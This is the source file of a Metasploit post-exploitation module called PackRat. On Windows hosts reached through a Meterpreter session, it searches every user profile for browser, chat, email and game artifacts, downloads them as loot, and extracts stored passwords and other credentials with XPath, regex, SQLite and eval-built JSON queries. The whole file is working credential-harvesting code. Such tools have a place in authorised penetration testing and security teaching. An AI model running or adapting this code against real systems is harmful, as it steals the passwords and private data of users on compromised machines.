##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  # this associative array defines the artifacts known to PackRat
  APPLICATION_ARRAY = JSON.parse(
    File.read(File.join(Msf::Config.data_directory, 'packrat', 'artifacts.json')),
    symbolize_names: true
  )

  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Windows Gather Application Artifacts (PackRat)',
      'Description' => %q{PackRat gathers artifacts of various categories from a large number of applications.
       Artifacts include: 12 browsers, 13 chat/IM/IRC applications, 6 email clients, and 1 game.
       Credentials are then extracted from the artifacts. The use case for this post-exploitation module is
       to specify the types of
       artifacts you are interested in, to gather the relevant files depending on your aims.
       Please refer to the options for a full list of filter categories.},
      'License' => MSF_LICENSE,
      'Author' =>
        [
          'Daniel Hallsworth', # Leeds Beckett University student
          'Barwar Salim M', # Leeds Beckett University student
          'Z. Cliffe Schreuders' # Leeds Beckett University lecturer (http://z.cliffe.schreuders.org)
        ],
      'Platform' => %w{win},
      'SessionTypes' => ['meterpreter']
      ))

    register_options(
      [
        OptRegexp.new('REGEX', [false, 'Match a regular expression', '^password']),
        OptBool.new('STORE_LOOT', [false, 'Store artifacts into loot database (otherwise, only download)', 'true']),
        # enumerates the options based on the artifacts that are defined below
        OptEnum.new('APPCATEGORY', [false, 'Category of applications to gather from', 'All', APPLICATION_ARRAY.map {|x| x[:category]}.uniq.unshift('All')]),
        OptEnum.new('APPLICATION', [false, 'Specify application to gather from', 'All', APPLICATION_ARRAY.map {|x| x[:application]}.uniq.unshift('All')]),
        OptEnum.new('ARTIFACTS', [false, 'Type of artifacts to collect', 'All', APPLICATION_ARRAY.map {|x| x[:filetypes]}.uniq.unshift('All')]),
      ])
  end

  def run
    print_status("Filtering based on these selections:  ")
    print_status("APPCATEGORY: #{datastore['APPCATEGORY'].capitalize}, APPLICATION: #{datastore['APPLICATION'].capitalize}, ARTIFACTS: #{datastore['ARTIFACTS'].capitalize}")

    #used to grab files for each user on the remote host.
    grab_user_profiles.each do |userprofile|
      APPLICATION_ARRAY.each {|app_loop|
        download(userprofile, app_loop)

      }
    end
    print_status "PackRat credential sweep Completed. Check for artifacts and credentials in Loot"
  end

  # Check to see if the artifact exists on the remote system.
  def location(profile, opts = {})

    artifact_parent = opts[:file_artifact]
    artifact_parent.each do |artifact_child|
      path = profile[artifact_child[:path]]
      dir = artifact_child[:dir]
      dirs = session.fs.dir.foreach(path).collect
      return dirs.include? dir
    end
  end

  def extract_xml(saving_path, artifact_child, artifact, local_loc)
    begin
      xml_file = Nokogiri::XML(File.read("#{saving_path}"))
      credential_array = []
      xml_credential = ""
      cred = "CREDENTIALS"

      artifact_child[:xml_search].each do |xml_split|
        xml_split[:xml].each do |xml_string|
          xml_file.xpath("#{xml_string}").each do |xml_match|
            vprint_status("#{xml_split[:extraction_description]}")
            print_good xml_match.to_s
            credential_array << xml_match.to_s
          end
        end
      end

      credential_array.each do |xml_write|
        file_save = xml_write.chomp + "\n" #wrties new line in file
        xml_credential << file_save.to_s
      end
      xml_credential_path = store_loot("#{artifact}#{cred}", "", session, "#{xml_credential}", local_loc) #saves multiple xml credentials per file
      print_status "File with credentials saved:  #{xml_credential_path}"
    rescue StandardError => error_message
      print_status error_message.to_s
    end
  end

  def extract_regex(saving_path, artifact_child, artifact, local_loc)
    begin
      cred = "CREDENTIALS"
      file_string = ""
      File.open("#{saving_path}", "rb").each do |file_content|
        file_string << file_content.to_s
      end

      credential_array = []
      cred_save = ""
      user_regex = datastore['REGEX']
      regex_string = user_regex.to_s

      artifact_child[:regex_search].each do |reg_child|
        reg_child[:regex].map { |r| Regexp.new(r) }.each do |regex_to_match|
          if file_string =~ regex_to_match
            file_string.scan(regex_to_match).each do |found_credential|
              file_strip = found_credential.gsub(/\s+/, "").to_s
              vprint_status("#{reg_child[:extraction_description]}")
              print_good file_strip
              credential_array << file_strip
            end
          end
        end
      end

      if file_string =~ user_regex
        file_string.scan(user_regex).each do |user_match|
          user_strip = user_match.gsub(/\s+/, "").to_s
          vprint_status "Searching for #{regex_string}"
          print_good user_strip.to_s
          credential_array << user_strip
        end
      end

      credential_array.each do |file_write|
        file_save = file_write.chomp + "\n"
        cred_save << file_save.to_s
      end #file_write end
      regex_credential_path = store_loot("#{artifact}#{cred}", "", session, "#{cred_save}", local_loc) #saves crdentials for each file
      print_status "File with credentials saved:  #{regex_credential_path}"
    rescue StandardError => error_message
      print_status error_message.to_s
    end
  end

  def extract_sqlite(saving_path, artifact_child, artifact, local_loc)
    begin
      cred = "CREDENTIALS"
      database_string = ""
      database_file = SQLite3::Database.open "#{saving_path}"

      artifact_child[:sql_search].each do |sql_child|
        select_db_info = database_file.prepare "SELECT #{sql_child[:sql_column]} FROM #{sql_child[:sql_table]}"
        execute_command = select_db_info.execute
        execute_command.each do |database_row|
          join_info = database_row.join "\s"
          line_split = join_info.chomp + "\n"
          database_string << line_split.to_s
        end
      end

      sql_credential_path = store_loot("#{artifact}#{cred}", "", session, "#{database_string}", local_loc) #saves neatened up database file
      print_status "File with credentials saved:  #{sql_credential_path}"

    rescue StandardError => error_message
      print_status error_message.to_s
    end
  end

  def extract_json(saving_path, artifact_child, artifact, local_loc)
    begin
      json_file = File.read("#{saving_path}")
      json_parse = JSON.parse(json_file)
      parent_json_query = ''
      child_json_query = []
      json_credential_save = []
      json_cred = ''
      cred = "CREDENTIALS"

      artifact_child[:json_search].each do |json_split|
        parent_json_query << json_split[:json_parent]
        json_split[:json_children].each do |json_child|
          child_json_query << json_child.to_s
        end #json_child end
      end #json_split end

      child_json_query.each do |split|
        children = eval("json_parse#{parent_json_query}")
        children.each {|child_node|
          child = eval("child_node#{split}").to_s
          json_credential_save << "#{split}:  #{child}"
        }
      end

      json_credential_save.each do |json_save|
        file_save = json_save.chomp + "\n"
        print_good file_save.to_s
        json_cred << file_save.to_s
      end #json_save end
      json_credential_path = store_loot("#{artifact}#{cred}", "", session, "#{json_cred}", local_loc) #saves crdentials for each file
      print_status "File with credentials saved:  #{json_credential_path}"
    rescue StandardError => error_message
      print_status error_message.to_s
    end
  end

  #Download file from the remote system, if it exists.
  def download(profile, opts = {})

    artifact_parent = opts[:file_artifact]
    artifact_parent.each do |artifact_child|
      category = opts[:category]
      application = opts[:application]
      artifact = artifact_child[:artifact]
      file_type = artifact_child[:filetypes]
      path = artifact_child[:path]
      credential_type = artifact_child[:credential_type]
      description = artifact_child[:description]

      # filter based on options
      if (category != datastore['APPCATEGORY'] && datastore['APPCATEGORY'] != 'All') || (application != datastore['APPLICATION'] && datastore['APPLICATION'] != 'All') || (file_type != datastore['ARTIFACTS'] && datastore['ARTIFACTS'] != 'All')
        # doesn't match search criteria, skip this artifact
        next
      end #if statement end
      vprint_status("Searching for #{application.capitalize}'s #{artifact.capitalize} files in #{profile['UserName']}'s user directory...")

      if location(profile, opts) # check if file exists in user's directory on the remote computer.
        print_status("#{application.capitalize}'s #{artifact.capitalize} file found")
      else
        vprint_error("#{application.capitalize}'s #{artifact.capitalize} not found in #{profile['UserName']}'s user directory\n")
        # skip non-existing file
        return false
      end

      #loops through apps array and returns each file
      file_directory = "#{profile[path]}\\#{artifact_child[:dir]}"
      files = session.fs.file.search(file_directory, "#{artifact}", true)

      return false unless files

      files.each do |file|
        file_split = file['path'].split('\\')
        local_loc = "#{file_split.last}#{artifact}"
        saving_path = store_loot("#{application}#{artifact}", "", session, "", local_loc)
        file_to_download = "#{file['path']}#{session.fs.file.separator}#{file['name']}"
        print_status("Downloading #{file_to_download}")
        session.fs.file.download_file(saving_path, file_to_download)
        print_status("#{application.capitalize} #{artifact.capitalize} downloaded (#{description})")
        print_good("File saved to:  #{saving_path}\n")

        if credential_type == 'xml'
          extract_xml(saving_path, artifact_child, artifact, local_loc)
        end

        if credential_type == 'json'
          extract_json(saving_path, artifact_child, artifact, local_loc)
        end

        if credential_type == 'text'
          extract_regex(saving_path, artifact_child, artifact, local_loc)
        end

        if credential_type == 'sqlite'
          extract_sqlite(saving_path, artifact_child, artifact, local_loc)
        end

      end
    end
    return true
  end
end
